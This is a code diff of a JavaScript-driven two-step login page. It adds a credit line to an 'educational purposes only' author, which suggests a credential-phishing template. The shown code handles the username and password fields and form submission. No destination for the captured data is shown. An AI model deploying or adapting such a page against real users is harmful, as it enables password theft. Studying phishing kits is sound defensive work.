@@ -63,13 +63,11 @@ xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpath d='M256 0L256 0L256 256L0
         document.getElementById("name").classList.add("hide"), document.getElementById("nameForgot").classList.add("hide"), document.getElementById("name").classList.remove("fadeOutLeft"), document.getElementById("nameForgot").classList.remove("fadeOutLeft"), document.getElementById("nameLabel").remove(), document.getElementById("nameForgot").remove(), showPasswordField()
       }, 600)
     }
-
     function showPasswordField() {
       document.getElementById("pass").classList.remove("hide"), document.getElementById("passShow").classList.remove("hide"), document.getElementById("showPass").classList.remove("hide"), document.getElementById("guestText").classList.add("hide"), document.getElementsByClassName("tagline")[0].classList.add("hide"), document.getElementsByClassName("title")[0].innerHTML = "Welcome", document.getElementById("profileEmail").innerHTML = window.name, document.getElementById("profileBadge").classList.remove("hide"), document.getElementById("cardBody").classList.remove("fadeOutLeft"), document.getElementById("cardBody").classList.add("fadeInRight"), hideError(), document.getElementById("passShow").classList.add("fadeInRight"), document.getElementById("actionBtn").innerHTML = "Forgot password?", setTimeout(function() {
         document.getElementById("pass").classList.remove("fadeInRight"), document.getElementById("passShow").classList.remove("fadeInRight"), document.getElementById("pass").setAttribute("placeholder", " "), document.getElementById("passLabel").classList.remove("hide")
       }, 500), document.getElementById("overlay").classList.add("hide"), document.getElementById("loader").style.backgroundColor = "transparent", document.getElementsByClassName("next")[0].setAttribute("onclick", "submitForm()")
     }
-
     function submitForm() {
       var e = document.getElementById("name").value,
         t = document.getElementById("pass").value;
@@ -83,13 +81,11 @@ xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpath d='M256 0L256 0L256 256L0
       }
       return document.getElementById("loginForm").submit(), !0
     }
-
     function showPass() {
       var e = document.getElementById("pass"),
         t = document.getElementById("showPass");
       "password" === e.type ? (e.type = "text", t.checked = !0) : (e.type = "password", t.checked = !1)
     }
-
     function hideError() {
       -1 == document.cookie.indexOf("submitted") || (document.getElementsByClassName("card")[0].style.height = "404px", document.getElementsByClassName("cardOutside")[0].style.height = "502px", document.getElementsByClassName("error")[0].classList.add("hide"), document.getElementsByClassName("footer")[0].classList.remove("hide"))
     } - 1 == document.cookie.indexOf("submitted") || (window.innerWidth < 600 && document.getElementsByClassName("footer")[0].classList.add("hide"), document.getElementsByClassName("card")[0].style.height = "460px", document.getElementsByClassName("cardOutside")[0].style.height = "560px", document.getElementsByClassName("error")[0].classList.remove("hide")), window.onresize = function() {
@@ -99,7 +95,7 @@ xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpath d='M256 0L256 0L256 256L0
         e = window.innerWidth + 73;
         document.getElementsByClassName("cardOutside")[0].style.width = e + "px"
       } else document.getElementsByClassName("card")[0].style.width = "377px", document.getElementsByClassName("cardOutside")[0].style.width = "450px"
-    }, console.log("done")
+    }, console.log("Made by beigeworm (https://github.com/beigeworm) for educational purposes only. Do not use this for illegal purposes! | Original script by JMcrafter26 (https://github.com/JMcrafter26)")
   </script>
   <script>
     if (window.innerWidth < 600) {
